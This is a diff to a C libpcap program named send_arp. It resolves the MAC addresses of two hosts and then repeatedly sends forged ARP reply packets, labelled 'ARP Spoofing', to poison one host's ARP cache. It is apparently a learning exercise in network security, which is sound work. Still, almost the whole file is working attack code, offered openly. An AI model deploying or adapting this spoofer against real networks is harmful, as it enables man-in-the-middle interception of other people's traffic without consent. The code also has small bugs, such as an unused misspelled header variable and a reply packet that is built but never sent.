@@ -2,9 +2,16 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <pcap.h>
-#include <arpa/inet.h>
 #include <string.h>
 #include <unistd.h>
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+
 
 #define HARDWARE_LEN 6
 #define PROTOCOL_LEN 4
@@ -36,7 +43,7 @@ struct arp_packet{
 };
 
 void usage() {
-	printf("Please execute like this\n ./send_arp <interface> <sender_ip> <target_ip>");;
+	printf("Please execute like this\n ./send_arp <interface> <sender_ip> <target_ip>\n");;
 }
 
 void * get_mac_address(uint8_t * my_MAC)
@@ -53,7 +60,41 @@ void * get_mac_address(uint8_t * my_MAC)
 
 }
 
-struct arp_packet request_packet(struct arp_packet packet, uint8_t * my_MAC, char * argv[])
+
+
+void * get_ip_address(uint8_t * my_ipaddr, char * interface)
+{
+	struct ifreq ifr;
+	char ipstr[40];
+	int s;
+
+	s = socket(AF_INET, SOCK_DGRAM, 0);
+	strncpy(ifr.ifr_name, interface, IFNAMSIZ);
+	uint8_t num = 0;
+	int cnt = 0;
+	int i=0;
+	if(ioctl(s, SIOCGIFADDR, &ifr) < 0)
+	{
+		printf("Error");
+	} else {
+		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
+		//sizeof(struct sockaddr)
+		do{
+			if(ipstr[i] == '.' || ipstr[i] == '\0')
+			{
+				my_ipaddr[cnt++] = num;
+				num = 0;
+			}else
+			{	
+				num = num * 10 + (ipstr[i] - '0');
+			}
+			i++;
+		}while(cnt != 4);
+	}
+}
+
+
+struct arp_packet request_packet(struct arp_packet packet, uint8_t * my_MAC,uint8_t * my_ipaddr, char * argv)
 {
 	for(int i=0; i<6; i++)
 	{
@@ -62,6 +103,7 @@ struct arp_packet request_packet(struct arp_packet packet, uint8_t * my_MAC, cha
 		packet.destination_mac[i] = '\xff';
 		packet.target_hardware_addr[i] ='\x00';
 	}
+	
 	packet.ether_type = htons(ETHER_TYPE_ARP);
 	packet.hardware_type = htons(HARDWARE_TYPE);
 	packet.protocol_type = htons(PROTOCOL_TYPE);
@@ -69,19 +111,57 @@ struct arp_packet request_packet(struct arp_packet packet, uint8_t * my_MAC, cha
 	packet.protocol_len = PROTOCOL_LEN;
 	packet.operation = htons(OPERATION_REQ);
 
-	uint32_t num = inet_addr(argv[2]);
-	packet.sender_ip_addresss[0] = num;
-	packet.sender_ip_addresss[1] = num >> 8;
-	packet.sender_ip_addresss[2] = num >> 16;
-	packet.sender_ip_addresss[3] = num >> 24;
+	packet.sender_ip_addresss[0] = my_ipaddr[0];
+	packet.sender_ip_addresss[1] = my_ipaddr[1];
+	packet.sender_ip_addresss[2] = my_ipaddr[2];
+	packet.sender_ip_addresss[3] = my_ipaddr[3];
 		
-	num = inet_addr(argv[3]);
+	uint32_t num = inet_addr(argv);
 	packet.target_ip_addresss[0] = num;
 	packet.target_ip_addresss[1] = num >> 8;
 	packet.target_ip_addresss[2] = num >> 16;
 	packet.target_ip_addresss[3] = num >> 24;
 
 	return packet;
+}
+
+struct arp_packet response_packet(struct arp_packet packet, uint8_t * my_MAC, char * sender_ip, char * target_ip)
+{
+	for(int i=0; i<6; i++)
+	{
+		packet.source_mac[i] = my_MAC[i];
+		packet.sender_hardware_addr[i] = my_MAC[i];
+		packet.target_hardware_addr[i] = packet.destination_mac[i];
+	}
+	
+	packet.ether_type = htons(ETHER_TYPE_ARP);
+	packet.hardware_type = htons(HARDWARE_TYPE);
+	packet.protocol_type = htons(PROTOCOL_TYPE);
+	packet.hardware_len = HARDWARE_LEN;
+	packet.protocol_len = PROTOCOL_LEN;
+	packet.operation = htons(OPERATION_REP);
+
+	uint32_t num = inet_addr(sender_ip);
+	packet.sender_ip_addresss[0] = num;
+	packet.sender_ip_addresss[1] = num >> 8;
+	packet.sender_ip_addresss[2] = num >> 16;
+	packet.sender_ip_addresss[3] = num >> 24;
+		
+	num = inet_addr(target_ip);
+	packet.target_ip_addresss[0] = num;
+	packet.target_ip_addresss[1] = num >> 8;
+	packet.target_ip_addresss[2] = num >> 16;
+	packet.target_ip_addresss[3] = num >> 24;
+
+	return packet;
+}
+
+void send_packet(struct arp_packet packet, pcap_t* handle)
+{
+	uint8_t *p = (uint8_t *)&packet;
+	struct pacp_pkthdr *header;
+	if(pcap_sendpacket(handle, p, 42) != 0)
+		fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));
 }
 
 int main(int argc, char* argv[])
@@ -93,14 +173,12 @@ int main(int argc, char* argv[])
 	}
 
 	uint8_t my_MAC[6];
-	struct arp_packet packet;
+	uint8_t my_ipaddr[4];
+	struct arp_packet packet, rep_packet_for_sender, rep_packet_for_target;
 
 	get_mac_address(my_MAC);
-	
-	packet = request_packet(packet, my_MAC, argv);
+	get_ip_address(my_ipaddr, argv[1]);
 
-	uint8_t *p = (uint8_t *)&packet;
-	struct pacp_pkthdr *header;
 	
 	char* dev = argv[1];
   	char errbuf[PCAP_ERRBUF_SIZE];
@@ -110,64 +188,66 @@ int main(int argc, char* argv[])
     fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
     return -1;
   	}
-  	printf("send packet--------------------------------------\n");
-    if(pcap_sendpacket(handle, p, 42) != 0)
-			fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));
+  	
+	uint8_t *p = (uint8_t *)&packet;
+  	printf("send arp request packet to know sender MAC--------------------------------------\n");
+	packet = request_packet(packet, my_MAC, my_ipaddr, argv[2]);
 
-  	while (true) {
-
-	    struct pcap_pkthdr* header;
-	    const u_char* packet2;
-	    int res = pcap_next_ex(handle, &header, &packet2);
+	send_packet(packet, handle);
+	/*uint8_t *p = (uint8_t *)&packet;
+	struct pacp_pkthdr *header;
+	if(pcap_sendpacket(handle, p, 42) != 0)
+		fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));
+	*/
+	while(true)	
+	{
+		struct pcap_pkthdr* header;
+		const u_char * packet2;
+		int res = pcap_next_ex(handle, &header, &packet2);
 
 	    if (res == 0) continue;
 	    if (res == -1 || res == -2) break;
 	    
 	    struct sniff_ethernet *ethernet;
 		ethernet = (struct sniff_ethernet*)(packet2);
-
-		printf("receive packet-----------------------------------\n");
-		printf("Ethernet destination MAC address is ");
-
-	   	for(int i=0;i<HARDWARE_LEN;i++)
-	   	{
-	   		printf("%x",ethernet->ether_dhost[i]);
-	   		if(i!=HARDWARE_LEN-1)
-	   			printf(":");
-	   	}
-
-	   	printf("\n");
-	   	printf("Ethernet source MAC address is ");
-	   	for(int i=0;i<HARDWARE_LEN;i++)
-	   	{
-	   		printf("%x",ethernet->ether_shost[i]);
-	   		packet.destination_mac[i] = ethernet->ether_shost[i];
-	   		if(i!=HARDWARE_LEN-1)
-	   			printf(":");
-	   	}
-	   	printf("\n");
-
-	   	printf("Target IP : %s\n", argv[2]);
-	   	printf("Target MAC : ");
-	   	for(int i=0;i<HARDWARE_LEN;i++)
-	   	{
-	   		printf("%x",packet.destination_mac[i]);
-	   		if(i!=HARDWARE_LEN-1)
-	   			printf(":");
-	   	}
-	   	printf("\n");
-
+		for(int i=0;i<HARDWARE_LEN;i++)
+			rep_packet_for_sender.destination_mac[i] = ethernet->ether_shost[i];
+		printf("Sender MAC is %x:%x:%x:%x:%x:%x\n", ethernet->ether_shost[0],ethernet->ether_shost[1],ethernet->ether_shost[2],ethernet->ether_shost[3],ethernet->ether_shost[4],ethernet->ether_shost[5]);
 		break;
 	}
-	packet.operation = htons(OPERATION_REP);
+	rep_packet_for_sender = response_packet(rep_packet_for_sender, my_MAC, argv[3], argv[2]);
+
+	printf("send arp request packet to know target MAC--------------------------------------\n");
+    
+    packet = request_packet(packet, my_MAC, my_ipaddr, argv[3]);
+	send_packet(packet, handle);
+
+	while(true)
+	{
+		struct pcap_pkthdr* header;
+		const u_char * packet2;
+		int res = pcap_next_ex(handle, &header, &packet2);
+
+	    if (res == 0) continue;
+	    if (res == -1 || res == -2) break;
+	    
+	    struct sniff_ethernet *ethernet;
+		ethernet = (struct sniff_ethernet*)(packet2);
+		for(int i=0;i<HARDWARE_LEN;i++)
+			rep_packet_for_target.destination_mac[i] = ethernet->ether_shost[i];
+		printf("Target MAC is %x:%x:%x:%x:%x:%x\n", ethernet->ether_shost[0],ethernet->ether_shost[1],ethernet->ether_shost[2],ethernet->ether_shost[3],ethernet->ether_shost[4],ethernet->ether_shost[5]);
+			break;
+	}
+
+	rep_packet_for_target = response_packet(rep_packet_for_target, my_MAC, argv[2], argv[3]);
 
 	while(1)
 	{
 		int cnt;
 		printf("Send ARP Spoofing Packet\n");
-		if(pcap_sendpacket(handle, p, 42) != 0)
-			fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));
-
+		//uint8_t *arp_spoof_sender = (uint8_t *)&rep_packet_for_sender;
+		struct pacp_pkthdr *header;
+		send_packet(rep_packet_for_sender,handle);
 		printf("Send packet one more time? Enter 1 \n Enter :");
 		scanf("%d", &cnt);
 		if(cnt != 1)
